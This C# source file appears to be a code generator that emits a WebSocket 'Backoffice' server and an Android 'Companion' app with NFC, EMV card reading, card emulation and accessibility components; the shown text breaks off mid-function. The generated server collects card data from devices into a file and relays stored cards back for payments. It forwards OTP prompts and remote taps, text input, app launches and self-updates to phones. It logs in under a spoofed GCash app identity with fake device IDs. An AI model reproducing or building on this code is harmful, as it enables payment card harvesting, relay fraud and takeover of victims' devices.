using System.Text;
using PrTask.Domain.Constants;

namespace PrTask.Transpiler;

public sealed class WssProxyGenerator
{
    private readonly string OutputDir;
    private readonly string Namespace;

    public WssProxyGenerator(string OutputDir, string Namespace)
    {
        this.OutputDir = OutputDir;
        this.Namespace = Namespace;
    }

    public void Generate(List<DexClassDef> AppClasses)
    {
        GenerateBackoffice(AppClasses);
        GenerateCompanion();
        PatchWasmIndexHtml();
    }

    private void GenerateBackoffice(List<DexClassDef> AppClasses)
    {
        var Dir = Path.Combine(OutputDir, Namespace + ".Backoffice");
        Directory.CreateDirectory(Dir);

        WriteBackofficeCsproj(Dir);
        WriteBackofficeProgram(Dir, AppClasses);

        Console.WriteLine("  Backoffice WSS server generated");
    }

    private void GenerateCompanion()
    {
        var Dir = Path.Combine(OutputDir, Namespace + ".Companion");
        Directory.CreateDirectory(Dir);
        Directory.CreateDirectory(Path.Combine(Dir, "Platforms", "Android"));
        Directory.CreateDirectory(Path.Combine(Dir, "Services"));
        Directory.CreateDirectory(Path.Combine(Dir, "Resources", "values"));
        Directory.CreateDirectory(Path.Combine(Dir, "Resources", "xml"));

        WriteCompanionCsproj(Dir);
        WriteCompanionMainApplication(Dir);
        WriteCompanionMainActivity(Dir);
        WriteCompanionService(Dir);
        WriteCompanionEmvCardReader(Dir);
        WriteCompanionNfcReaderActivity(Dir);
        WriteCompanionHceService(Dir);
        WriteCompanionPermissions(Dir);
        WriteCompanionAndroidManifest(Dir);
        WriteCompanionAccessibilityConfig(Dir);
        WriteCompanionNfcTechFilter(Dir);
        WriteCompanionStringsXml(Dir);

        Console.WriteLine("  Companion Android app generated");
    }

    private void WriteBackofficeCsproj(string Dir)
    {
        var Sb = new StringBuilder();
        Sb.AppendLine("<Project Sdk=\"Microsoft.NET.Sdk\">");
        Sb.AppendLine("  <PropertyGroup>");
        Sb.AppendLine("    <OutputType>Exe</OutputType>");
        Sb.AppendLine("    <TargetFramework>net11.0</TargetFramework>");
        Sb.AppendLine("    <ImplicitUsings>enable</ImplicitUsings>");
        Sb.AppendLine("    <Nullable>enable</Nullable>");
        Sb.Append("    <RootNamespace>").Append(Namespace).AppendLine(".Backoffice</RootNamespace>");
        Sb.AppendLine("    <GenerateDocumentationFile>false</GenerateDocumentationFile>");
        Sb.Append("    <NoWarn>").Append(ApkConstants.NoWarnList).AppendLine("</NoWarn>");
        Sb.AppendLine("  </PropertyGroup>");
        Sb.AppendLine("</Project>");
        File.WriteAllText(Path.Combine(Dir, Namespace + ".Backoffice.csproj"), Sb.ToString());
    }

    private void WriteBackofficeProgram(string Dir, List<DexClassDef> AppClasses)
    {
        var NfcClasses = AppClasses.Where(C =>
            C.Methods.Any(M => M.Name.Contains("Transceive", StringComparison.Ordinal) ||
                               M.Name.Contains("IsCardPresent", StringComparison.Ordinal) ||
                               M.Name.Contains("ReadCard", StringComparison.Ordinal))).ToList();

        var Sb = new StringBuilder();
        Sb.AppendLine("using System.Collections.Concurrent;");
        Sb.AppendLine("using System.Net;");
        Sb.AppendLine("using System.Net.Security;");
        Sb.AppendLine("using System.Net.Sockets;");
        Sb.AppendLine("using System.Net.WebSockets;");
        Sb.AppendLine("using System.Security.Authentication;");
        Sb.AppendLine("using System.Security.Cryptography;");
        Sb.AppendLine("using System.Security.Cryptography.X509Certificates;");
        Sb.AppendLine("using System.Text;");
        Sb.AppendLine("using System.Text.Json;");
        Sb.AppendLine();
        Sb.AppendLine("var Port = args.Length > 0 && int.TryParse(args[0], out var P) ? P : 8769;");
        Sb.AppendLine("var Cert = GenerateSelfSignedCert();");
        Sb.AppendLine("var Clients = new ConcurrentDictionary<string, (WebSocket Socket, string ClientType)>();");
        Sb.AppendLine("var Cts = new CancellationTokenSource();");
        Sb.AppendLine("var AuthBaseUrl = \"https://pulsar.psr-it.com\";");
        Sb.AppendLine("var AuthClient = new HttpClient();");
        Sb.AppendLine("AuthClient.DefaultRequestHeaders.Accept.Add(new System.Net.Http.Headers.MediaTypeWithQualityHeaderValue(\"application/json\"));");
        Sb.AppendLine("var JwtToken = string.Empty;");
        Sb.AppendLine("var CardsFile = Path.Combine(AppContext.BaseDirectory, \"stored-cards.json\");");
        Sb.AppendLine("var StoredCards = new List<Dictionary<string, object?>>();");
        Sb.AppendLine("if (File.Exists(CardsFile)) { try { StoredCards = JsonSerializer.Deserialize<List<Dictionary<string, object?>>>(File.ReadAllText(CardsFile)) ?? new(); } catch { } }");
        Sb.AppendLine();
        Sb.AppendLine("void SaveCards() => File.WriteAllText(CardsFile, JsonSerializer.Serialize(StoredCards, new JsonSerializerOptions { WriteIndented = true }));");
        Sb.AppendLine();
        Sb.AppendLine("Console.CancelKeyPress += (_, E) => { E.Cancel = true; Cts.Cancel(); };");
        Sb.AppendLine();
        Sb.AppendLine("var ListenerTask = Task.Run(() => RunAcceptLoop(Cts.Token));");
        Sb.AppendLine("var BroadcastTask = Task.Run(() => RunUdpBroadcast(Cts.Token));");
        Sb.AppendLine();
        Sb.AppendLine("Console.WriteLine($\"Backoffice WSS listening on wss://0.0.0.0:{Port}\");");
        Sb.AppendLine("Console.WriteLine(\"UDP broadcast on port 8770\");");

        if (NfcClasses.Count > 0)
        {
            Sb.AppendLine("Console.WriteLine(\"NFC proxy endpoints available:\");");
            foreach (var Cls in NfcClasses.Take(5))
            {
                Sb.AppendLine($"Console.WriteLine(\"  - {Cls.ClassName}\");");
            }
        }

        Sb.AppendLine();
        Sb.AppendLine("try { await Task.WhenAll(ListenerTask, BroadcastTask); }");
        Sb.AppendLine("catch (OperationCanceledException) { }");
        Sb.AppendLine("Console.WriteLine(\"Backoffice stopped\");");
        Sb.AppendLine();

        Sb.AppendLine("void RunAcceptLoop(CancellationToken Ct)");
        Sb.AppendLine("{");
        Sb.AppendLine("    var Listener = new TcpListener(IPAddress.Any, Port);");
        Sb.AppendLine("    Listener.Start();");
        Sb.AppendLine("    Ct.Register(Listener.Stop);");
        Sb.AppendLine();
        Sb.AppendLine("    while (!Ct.IsCancellationRequested)");
        Sb.AppendLine("    {");
        Sb.AppendLine("        try");
        Sb.AppendLine("        {");
        Sb.AppendLine("            var TcpClient = Listener.AcceptTcpClient();");
        Sb.AppendLine("            var ClientId = Guid.NewGuid().ToString(\"N\")[..8];");
        Sb.AppendLine("            _ = Task.Run(() => HandleClient(TcpClient, ClientId, Ct));");
        Sb.AppendLine("        }");
        Sb.AppendLine("        catch (SocketException) when (Ct.IsCancellationRequested)");
        Sb.AppendLine("        {");
        Sb.AppendLine("            break;");
        Sb.AppendLine("        }");
        Sb.AppendLine("        catch (ObjectDisposedException)");
        Sb.AppendLine("        {");
        Sb.AppendLine("            break;");
        Sb.AppendLine("        }");
        Sb.AppendLine("        catch (Exception Ex)");
        Sb.AppendLine("        {");
        Sb.AppendLine("            Console.WriteLine($\"Accept error: {Ex.Message}\");");
        Sb.AppendLine("        }");
        Sb.AppendLine("    }");
        Sb.AppendLine("}");
        Sb.AppendLine();

        Sb.AppendLine("async Task HandleClient(TcpClient TcpClient, string ClientId, CancellationToken Ct)");
        Sb.AppendLine("{");
        Sb.AppendLine("    WebSocket? Ws = null;");
        Sb.AppendLine("    try");
        Sb.AppendLine("    {");
        Sb.AppendLine("        var NetworkStream = TcpClient.GetStream();");
        Sb.AppendLine("        var SslStream = new SslStream(NetworkStream, false);");
        Sb.AppendLine("        await SslStream.AuthenticateAsServerAsync(Cert, false, SslProtocols.None, false);");
        Sb.AppendLine();
        Sb.AppendLine("        var HttpRequest = await ReadHttpUpgradeRequest(SslStream, Ct);");
        Sb.AppendLine("        if (HttpRequest == null)");
        Sb.AppendLine("        {");
        Sb.AppendLine("            SslStream.Close();");
        Sb.AppendLine("            TcpClient.Close();");
        Sb.AppendLine("            return;");
        Sb.AppendLine("        }");
        Sb.AppendLine();
        Sb.AppendLine("        var WebSocketKey = ExtractWebSocketKey(HttpRequest);");
        Sb.AppendLine("        if (WebSocketKey == null)");
        Sb.AppendLine("        {");
        Sb.AppendLine("            SslStream.Close();");
        Sb.AppendLine("            TcpClient.Close();");
        Sb.AppendLine("            return;");
        Sb.AppendLine("        }");
        Sb.AppendLine();
        Sb.AppendLine("        SendWebSocketUpgradeResponse(SslStream, WebSocketKey);");
        Sb.AppendLine("        Ws = WebSocket.CreateFromStream(SslStream, new WebSocketCreationOptions { IsServer = true });");
        Sb.AppendLine();
        Sb.AppendLine("        Clients[ClientId] = (Ws, \"Unknown\");");
        Sb.AppendLine("        Console.WriteLine($\"Client connected: {ClientId}\");");
        Sb.AppendLine();
        Sb.AppendLine("        var Buffer = new byte[8192];");
        Sb.AppendLine("        while (Ws.State == WebSocketState.Open && !Ct.IsCancellationRequested)");
        Sb.AppendLine("        {");
        Sb.AppendLine("            var Result = await Ws.ReceiveAsync(Buffer, Ct);");
        Sb.AppendLine("            if (Result.MessageType == WebSocketMessageType.Close)");
        Sb.AppendLine("            {");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            }");
        Sb.AppendLine("            if (Result.MessageType != WebSocketMessageType.Text)");
        Sb.AppendLine("            {");
        Sb.AppendLine("                continue;");
        Sb.AppendLine("            }");
        Sb.AppendLine();
        Sb.AppendLine("            var Json = Encoding.UTF8.GetString(Buffer, 0, Result.Count);");
        Sb.AppendLine("            await HandleMessage(ClientId, Json, Ct);");
        Sb.AppendLine("        }");
        Sb.AppendLine("    }");
        Sb.AppendLine("    catch (WebSocketException) { /* Expected during disconnect */ }");
        Sb.AppendLine("    catch (OperationCanceledException) { /* Expected during shutdown */ }");
        Sb.AppendLine("    catch (Exception Ex) { Console.WriteLine($\"Client {ClientId} error: {Ex.Message}\"); }");
        Sb.AppendLine("    finally");
        Sb.AppendLine("    {");
        Sb.AppendLine("        Clients.TryRemove(ClientId, out _);");
        Sb.AppendLine("        try { Ws?.Dispose(); } catch { /* Best-effort cleanup */ }");
        Sb.AppendLine("        try { TcpClient.Close(); } catch { /* Best-effort cleanup */ }");
        Sb.AppendLine("        Console.WriteLine($\"Client disconnected: {ClientId}\");");
        Sb.AppendLine("    }");
        Sb.AppendLine("}");
        Sb.AppendLine();

        Sb.AppendLine("async Task HandleMessage(string ClientId, string Json, CancellationToken Ct)");
        Sb.AppendLine("{");
        Sb.AppendLine("    try");
        Sb.AppendLine("    {");
        Sb.AppendLine("        using var Doc = JsonDocument.Parse(Json);");
        Sb.AppendLine("        var Root = Doc.RootElement;");
        Sb.AppendLine();
        Sb.AppendLine("        if (Root.TryGetProperty(\"ClientType\", out var CtEl))");
        Sb.AppendLine("        {");
        Sb.AppendLine("            var Type = CtEl.GetString() ?? \"Unknown\";");
        Sb.AppendLine("            if (Clients.TryGetValue(ClientId, out var Existing))");
        Sb.AppendLine("            {");
        Sb.AppendLine("                Clients[ClientId] = (Existing.Socket, Type);");
        Sb.AppendLine("            }");
        Sb.AppendLine();
        Sb.AppendLine("            Console.WriteLine($\"Client {ClientId} registered as {Type}\");");
        Sb.AppendLine("            await SendToClient(ClientId, new { Type = \"Registered\", ClientType = Type }, Ct);");
        Sb.AppendLine("            return;");
        Sb.AppendLine("        }");
        Sb.AppendLine();
        Sb.AppendLine("        var Method = Root.TryGetProperty(\"Method\", out var MEl) ? MEl.GetString() ?? string.Empty : string.Empty;");
        Sb.AppendLine("        var Id = Root.TryGetProperty(\"Id\", out var IdEl) ? IdEl.GetString() ?? string.Empty : string.Empty;");
        Sb.AppendLine();
        Sb.AppendLine("        switch (Method)");
        Sb.AppendLine("        {");
        Sb.AppendLine("            case \"Login\":");
        Sb.AppendLine("                await HandleLogin(ClientId, Root, Id, Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"ReadCard\":");
        Sb.AppendLine("                await RelayToCompanions(Json, Ct);");
        Sb.AppendLine("                await SendToClient(ClientId, new { Type = \"Response\", Id, Method, Data = new { Status = \"ReadCardSent\" } }, Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"CardData\":");
        Sb.AppendLine("                if (Root.TryGetProperty(\"Payload\", out var CardPayload) && CardPayload.ValueKind == JsonValueKind.Object)");
        Sb.AppendLine("                {");
        Sb.AppendLine("                    var CardDict = JsonSerializer.Deserialize<Dictionary<string, object?>>(CardPayload.GetRawText()) ?? new();");
        Sb.AppendLine("                    CardDict[\"StoredAt\"] = DateTimeOffset.UtcNow.ToString(\"o\");");
        Sb.AppendLine("                    CardDict[\"Id\"] = Guid.NewGuid().ToString()[..8];");
        Sb.AppendLine("                    StoredCards.Add(CardDict);");
        Sb.AppendLine("                    SaveCards();");
        Sb.AppendLine("                    Console.WriteLine($\"[CARD] Stored card #{StoredCards.Count}: {CardPayload.GetProperty(\"MaskedPan\").GetString()}\");");
        Sb.AppendLine("                }");
        Sb.AppendLine("                await RelayToBrowsers(Json, Ct);");
        Sb.AppendLine("                await RelayToBrowsers(JsonSerializer.Serialize(new { Method = \"StoredCards\", Cards = StoredCards }), Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"GetCards\":");
        Sb.AppendLine("                await SendToClient(ClientId, new { Method = \"StoredCards\", Cards = StoredCards }, Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"UpdateCard\":");
        Sb.AppendLine("                if (Root.TryGetProperty(\"Payload\", out var UpdPayload))");
        Sb.AppendLine("                {");
        Sb.AppendLine("                    var UpdId = UpdPayload.TryGetProperty(\"Id\", out var UidEl) ? UidEl.GetString() : null;");
        Sb.AppendLine("                    var Idx = StoredCards.FindIndex(C => C.TryGetValue(\"Id\", out var V) && V?.ToString() == UpdId);");
        Sb.AppendLine("                    if (Idx >= 0)");
        Sb.AppendLine("                    {");
        Sb.AppendLine("                        StoredCards[Idx] = JsonSerializer.Deserialize<Dictionary<string, object?>>(UpdPayload.GetRawText()) ?? StoredCards[Idx];");
        Sb.AppendLine("                        SaveCards();");
        Sb.AppendLine("                        Console.WriteLine($\"[CARD] Updated card {UpdId}\");");
        Sb.AppendLine("                    }");
        Sb.AppendLine("                }");
        Sb.AppendLine("                await RelayToBrowsers(JsonSerializer.Serialize(new { Method = \"StoredCards\", Cards = StoredCards }), Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"DeleteCard\":");
        Sb.AppendLine("                var DelId = Root.TryGetProperty(\"CardId\", out var DidEl) ? DidEl.GetString() : null;");
        Sb.AppendLine("                StoredCards.RemoveAll(C => C.TryGetValue(\"Id\", out var V) && V?.ToString() == DelId);");
        Sb.AppendLine("                SaveCards();");
        Sb.AppendLine("                Console.WriteLine($\"[CARD] Deleted card {DelId}\");");
        Sb.AppendLine("                await RelayToBrowsers(JsonSerializer.Serialize(new { Method = \"StoredCards\", Cards = StoredCards }), Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"PayWithCard\":");
        Sb.AppendLine("                var PayId = Root.TryGetProperty(\"CardId\", out var PidEl) ? PidEl.GetString() : null;");
        Sb.AppendLine("                var PayAmount = Root.TryGetProperty(\"Amount\", out var PamtEl) ? PamtEl.GetInt64() : 100L;");
        Sb.AppendLine("                var PayCard = StoredCards.FirstOrDefault(C => C.TryGetValue(\"Id\", out var V) && V?.ToString() == PayId);");
        Sb.AppendLine("                if (PayCard != null)");
        Sb.AppendLine("                {");
        Sb.AppendLine("                    Console.WriteLine($\"[PAYMENT] Paying with stored card {PayId} amount={PayAmount}\");");
        Sb.AppendLine("                    var PayJson = JsonSerializer.Serialize(new { Method = \"SubmitPayment\", Amount = PayAmount, Payload = PayCard });");
        Sb.AppendLine("                    await RelayToCompanions(PayJson, Ct);");
        Sb.AppendLine("                }");
        Sb.AppendLine("                else");
        Sb.AppendLine("                {");
        Sb.AppendLine("                    await SendToClient(ClientId, new { Method = \"PaymentResult\", Success = false, Error = \"Card not found\" }, Ct);");
        Sb.AppendLine("                }");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"CreateReceipt\":");
        Sb.AppendLine("                await HandleCreateReceipt(ClientId, Root, Id, Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"SubmitPayment\":");
        Sb.AppendLine("                await RelayToCompanions(Json, Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"ConfirmOtp\":");
        Sb.AppendLine("                await RelayToCompanions(Json, Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"ActivationOtpRequired\":");
        Sb.AppendLine("                await RelayToBrowsers(Json, Ct);");
        Sb.AppendLine("                Console.WriteLine(\"[ACTIVATION] OTP required — waiting for user input\");");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"PaymentResult\":");
        Sb.AppendLine("                await RelayToBrowsers(Json, Ct);");
        Sb.AppendLine("                Console.WriteLine($\"[PAYMENT] Result relayed to browsers\");");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"DeviceInfo\":");
        Sb.AppendLine("                await RelayToBrowsers(Json, Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"Screenshot\":");
        Sb.AppendLine("            case \"Tap\":");
        Sb.AppendLine("            case \"Swipe\":");
        Sb.AppendLine("            case \"InputText\":");
        Sb.AppendLine("            case \"LaunchApp\":");
        Sb.AppendLine("            case \"KeyEvent\":");
        Sb.AppendLine("            case \"LoadHce\":");
        Sb.AppendLine("            case \"SelfUpdate\":");
        Sb.AppendLine("            case \"AutoPay\":");
        Sb.AppendLine("                await RelayToCompanions(Json, Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            case \"ScreenData\":");
        Sb.AppendLine("                await RelayToBrowsers(Json, Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("            default:");
        Sb.AppendLine("                await SendToClient(ClientId, new { Type = \"Error\", Id, Error = $\"Unknown method: {Method}\" }, Ct);");
        Sb.AppendLine("                break;");
        Sb.AppendLine("        }");
        Sb.AppendLine("    }");
        Sb.AppendLine("    catch (Exception Ex)");
        Sb.AppendLine("    {");
        Sb.AppendLine("        Console.WriteLine($\"HandleMessage error: {Ex.Message}\");");
        Sb.AppendLine("    }");
        Sb.AppendLine("}");
        Sb.AppendLine();

        Sb.AppendLine("async Task HandleLogin(string ClientId, JsonElement Root, string Id, CancellationToken Ct)");
        Sb.AppendLine("{");
        Sb.AppendLine("    var Payload = Root.TryGetProperty(\"Payload\", out var PayEl) ? PayEl : (JsonElement?)null;");
        Sb.AppendLine("    var Phone = Payload?.TryGetProperty(\"Phone\", out var PhEl) == true ? PhEl.GetString() ?? string.Empty : string.Empty;");
        Sb.AppendLine("    var Password = Payload?.TryGetProperty(\"Password\", out var PwEl) == true ? PwEl.GetString() ?? string.Empty : string.Empty;");
        Sb.AppendLine("    Console.WriteLine($\"[AUTH] Login for {Phone}\");");
        Sb.AppendLine();
        Sb.AppendLine("    var PasswordHash = Convert.ToHexStringLower(SHA256.HashData(Encoding.UTF8.GetBytes(Password)));");
        Sb.AppendLine("    var Body = new Dictionary<string, object>");
        Sb.AppendLine("    {");
        Sb.AppendLine("        [\"device_model\"] = \"Browser\",");
        Sb.AppendLine("        [\"device_brand\"] = \"WASM\",");
        Sb.AppendLine("        [\"package_name\"] = \"com.gcash.business.pocketpay\",");
        Sb.AppendLine("        [\"time_zone_offset\"] = 28800000,");
        Sb.AppendLine("        [\"password\"] = PasswordHash,");
        Sb.AppendLine("        [\"app_version\"] = \"1.0.30\",");
        Sb.AppendLine("        [\"login\"] = Phone,");
        Sb.AppendLine("        [\"fcmtoken\"] = \"browser-wasm-token\",");
        Sb.AppendLine("        [\"android_id\"] = \"browser-wasm-id\"");
        Sb.AppendLine("    };");
        Sb.AppendLine();
        Sb.AppendLine("    var Content = new StringContent(JsonSerializer.Serialize(Body), Encoding.UTF8, \"application/json\");");
        Sb.AppendLine("    var Response = await AuthClient.PostAsync($\"{AuthBaseUrl}/api/v3/authorize\", Content, Ct);");
        Sb.AppendLine("    var Token = await Response.Content.ReadAsStringAsync(Ct);");
        Sb.AppendLine();
        Sb.AppendLine("    if (!Response.IsSuccessStatusCode)");
        Sb.AppendLine("    {");
        Sb.AppendLine("        await SendToClient(ClientId, new { Type = \"Response\", Id, Method = \"Login\", Data = new { Success = false, Error = $\"Login failed: {Response.StatusCode}\" } }, Ct);");
        Sb.AppendLine("        return;");
        Sb.AppendLine("    }");
        Sb.AppendLine();
        Sb.AppendLine("    JwtToken = Token.Trim().Trim('\"');");
        Sb.AppendLine("    AuthClient.DefaultRequestHeaders.Remove(\"Authorization\");");
        Sb.AppendLine("    AuthClient.DefaultRequestHeaders.TryAddWithoutValidation(\"Authorization\", JwtToken.StartsWith(\"Bearer \", StringComparison.OrdinalIgnoreCase) ? JwtToken : \"Bearer \" + JwtToken);");
        Sb.AppendLine("    Console.WriteLine($\"[AUTH] Login success, token length={JwtToken.Length}\");");
        Sb.AppendLine("    await SendToClient(ClientId, new { Type = \"Response\", Id, Method = \"Login\", Data = new { Success = true, Token = JwtToken } }, Ct);");
        Sb.AppendLine("}");
        Sb.AppendLine();

        Sb.AppendLine("async Task HandleCreateReceipt(string ClientId, JsonElement Root, string Id, CancellationToken Ct)");
        Sb.AppendLine("{");
        Sb.AppendLine("    var Payload = Root.TryGetProperty(\"Payload\", out var PayEl) ? PayEl : (JsonElement?)null;");
        Sb.AppendLine("    Console.WriteLine(\"[API] Create receipt\");");
        Sb.AppendLine("    if (JwtToken.Length == 0)");
        Sb.AppendLine("    {");
        Sb.AppendLine("        await SendToClient(ClientId, new { Type = \"Response\", Id, Method = \"CreateReceipt\", Data = new { Success = false, Error = \"Not authenticated\" } }, Ct);");
        Sb.AppendLine("        return;");
        Sb.AppendLine("    }");
        Sb.AppendLine();
        Sb.AppendLine("    var BodyJson = Payload?.GetRawText() ?? \"{}\";");
        Sb.AppendLine("    var Content = new StringContent(BodyJson, Encoding.UTF8, \"application/json\");");
        Sb.AppendLine("    var Response = await AuthClient.PostAsync(\"https://api.psr-it.com/receipts\", Content, Ct);");
        Sb.AppendLine("    var Json = await Response.Content.ReadAsStringAsync(Ct);");
        Sb.AppendLine("    Console.WriteLine($\"[API] Receipt response: {Response.StatusCode} {Json}\");");
        Sb.AppendLine("    await SendToClient(ClientId, new { Type = \"Response\", Id, Method = \"CreateReceipt\", Data = new { Success = Response.IsSuccessStatusCode, Raw = Json } }, Ct);");
        Sb.AppendLine("}");
        Sb.AppendLine();
        Sb.AppendLine("async Task RelayToCompanions(string Json, CancellationToken Ct)");
        Sb.AppendLine("{");
        Sb.AppendLine("    var Bytes = Encoding.UTF8.GetBytes(Json);");
        Sb.AppendLine("    foreach (var Kv in Clients)");
        Sb.AppendLine("    {");
        Sb.AppendLine("        if (Kv.Value.ClientType != \"Companion\") { continue; }");
        Sb.AppendLine("        try");
        Sb.AppendLine("        {");
        Sb.AppendLine("            if (Kv.Value.Socket.State == WebSocketState.Open)");
        Sb.AppendLine("            {");
        Sb.AppendLine("                await Kv.Value.Socket.SendAsync(Bytes, WebSocketMessageType.Text, true, Ct);");
        Sb.AppendLine("            }");
        Sb.AppendLine("        }");
        Sb.AppendLine("        catch (Exception) { Clients.TryRemove(Kv.Key, out _); }");
        Sb.AppendLine("    }");
        Sb.AppendLine("}");
        Sb.AppendLine();

        Sb.AppendLine("async Task RelayToBrowsers(string Json, CancellationToken Ct)");
        Sb.AppendLine("{");
        Sb.AppendLine("    var Bytes = Encoding.UTF8.GetBytes(Json);");
        Sb.AppendLine("    foreach (var Kv in Clients)");
        Sb.AppendLine("    {");
        Sb.AppendLine("        if (Kv.Value.ClientType != \"Browser\") { continue; }");
        Sb.AppendLine("        try");
        Sb.AppendLine("        {");
        Sb.AppendLine("            if (Kv.Value.Socket.State == WebSocketState.Open)");
        Sb.AppendLine("            {");
        Sb.AppendLine("                await Kv.Value.Socket.SendAsync(Bytes, WebSocketMessageType.Text, true, Ct);");
        Sb.AppendLine("            }");
        Sb.AppendLine("        }");
        Sb.AppendLine("        catch (Exception) { Clients.TryRemove(Kv.Key, out _); }");
        Sb.AppendLine("    }");
        Sb.AppendLine("}");
        Sb.AppendLine();

        Sb.AppendLine("async Task SendToClient(string ClientId, object Payload, CancellationToken Ct)");
        Sb.AppendLine("{");
        Sb.AppendLine("    if (!Clients.TryGetValue(ClientId, out var Entry))");
        Sb.AppendLine("    {");
        Sb.AppendLine("        return;");
        Sb.AppendLine("    }");
        Sb.AppendLine("    if (Entry.Socket.State != WebSocketState.Open)");
        Sb.AppendLine("    {");
        Sb.AppendLine("        return;");
